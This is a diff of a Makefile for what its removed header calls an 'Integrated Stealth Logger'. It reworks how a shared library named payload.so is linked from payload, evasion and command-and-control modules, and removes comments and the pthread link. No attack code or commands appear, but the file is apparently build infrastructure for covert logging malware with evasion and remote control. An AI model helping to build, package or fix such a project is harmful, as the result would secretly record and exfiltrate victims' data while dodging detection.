@@ -1,18 +1,15 @@
-# Integrated Stealth Logger Makefile
 CC = gcc
-CFLAGS = -Wall -Wextra -O2 -fPIC -std=c99
-LDFLAGS = -shared -lpthread
+CFLAGS = -Wall -Wextra -O2 -fPIC
+LDFLAGS = -shared
 
-# Targets
-all: libpayload.so main
+all: payload.so
 
-libpayload.so: payload.o evasion.o c2_communication_fixed.o
+payload.so: main.o payload.o evasion.o c2_communication_fixed.o
 	$(CC) $(LDFLAGS) -o $@ $^
 
-main: main.o
-	$(CC) $(CFLAGS) -o $@ $^
+main.o: main.c payload.h evasion.h c2_communication_fixed.h config.h
+	$(CC) $(CFLAGS) -c -o $@ $<
 
-# Object files
 payload.o: payload.c payload.h payload_config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
@@ -22,11 +19,7 @@ evasion.o: evasion.c evasion.h config.h
 c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
-main.o: main.c payload.h evasion.h c2_communication_fixed.h
-	$(CC) $(CFLAGS) -c -o $@ $<
-
-# Clean
 clean:
-	rm -f *.o libpayload.so main
+	rm -f *.o payload.so
 
 .PHONY: all clean
